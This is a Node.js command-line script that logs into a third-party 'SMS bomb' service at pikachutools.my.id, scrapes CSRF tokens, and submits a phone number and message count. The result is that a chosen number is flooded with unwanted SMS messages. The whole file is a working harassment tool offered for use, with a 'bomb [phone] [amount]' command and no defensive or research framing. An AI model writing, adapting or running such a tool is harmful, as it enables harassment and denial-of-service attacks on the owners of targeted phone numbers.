const axios = require('axios').default;
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const cheerio = require('cheerio');
const FormData = require('form-data');
const readline = require('readline');

// Load environment variables
require('dotenv').config();

const email = process.env.EMAIL || 'your_email@example.com';
const password = process.env.PASSWORD || 'your_password';

const jar = new CookieJar();
const client = wrapper(axios.create({ 
  jar,
  timeout: 10000,
  maxRedirects: 5
}));

async function login() {
  try {
    console.log('Fetching login page...');
    const loginPage = await client.get('https://www.pikachutools.my.id/user/login');
    
    const $ = cheerio.load(loginPage.data);
    const token = $('input[name="_token"]').val();
    
    if (!token) {
      throw new Error('CSRF token not found');
    }

    console.log('Attempting login...');
    const loginRes = await client.post(
      'https://www.pikachutools.my.id/user/login',
      `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&_token=${encodeURIComponent(token)}`,
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'https://www.pikachutools.my.id',
          'Referer': 'https://www.pikachutools.my.id/user/login'
        }
      }
    );

    if ([301, 302].includes(loginRes.status) || loginRes.request?.path?.includes('/user')) {
      console.log('Login successful!');
      return true;
    }
    
    throw new Error('Login failed - unknown response');

  } catch (e) {
    console.error('⚠️ Login error:', e.message);
    console.error('Details:', e.response?.data || 'No response data');
    return false;
  }
}

async function sendBomb(phone, amount) {
  try {
    console.log('Fetching user page for CSRF token...');
    const userPage = await client.get('https://www.pikachutools.my.id/user');
    const $ = cheerio.load(userPage.data);
    const token = $('input[name="_token"]').val();
    
    if (!token) {
      throw new Error('CSRF token not found on user page');
    }

    console.log('Preparing bomb request...');
    const form = new FormData();
    form.append('_token', token);
    form.append('nomor', phone);
    form.append('jumlah', amount);

    console.log('Sending bomb request...');
    const res = await client.post(
      'https://www.pikachutools.my.id/user', 
      form,
      {
        headers: {
          ...form.getHeaders(),
          'Origin': 'https://www.pikachutools.my.id',
          'Referer': 'https://www.pikachutools.my.id/user'
        }
      }
    );

    if (res.data?.status === true) {
      return `✅ Bomb successfully sent to ${phone} (${amount} requests)`;
    }
    
    return `❌ Bomb failed. Response: ${JSON.stringify(res.data, null, 2)}`;

  } catch (e) {
    console.error('⚠️ Send Bomb error:', e.message);
    console.error('Details:', e.response?.data || 'No response data');
    return `🚨 Critical error: ${e.message}`;
  }
}

// Command line interface
function setupCLI() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  console.log(`
  \x1b[36m
  ██████╗  ██████╗ ███╗   ███╗██████╗ 
  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
  ██████╔╝██║   ██║██╔████╔██║██████╔╝
  ██╔══██╗██║   ██║██║╚██╔╝██║██╔═══╝ 
  ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║     
  ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     
  \x1b[0m
  Commands:
  - bomb [phone] [amount] - Send SMS bomb
  - exit - Quit the program
  `);

  rl.on('line', async (input) => {
    const [command, ...args] = input.trim().split(' ');
    
    if (command === 'bomb') {
      const [phone, amount] = args;
      if (!phone || !amount) {
        console.log('❌ Usage: bomb [phone] [amount]');
        return;
      }
      
      const loggedIn = await login();
      if (loggedIn) {
        const result = await sendBomb(phone, amount);
        console.log(result);
      }
    } else if (command === 'exit') {
      rl.close();
    } else {
      console.log('❌ Unknown command');
    }
  });

  rl.on('close', () => {
    console.log('👋 Goodbye!');
    process.exit(0);
  });
}

// Run the program
setupCLI();

module.exports = { login, sendBomb };
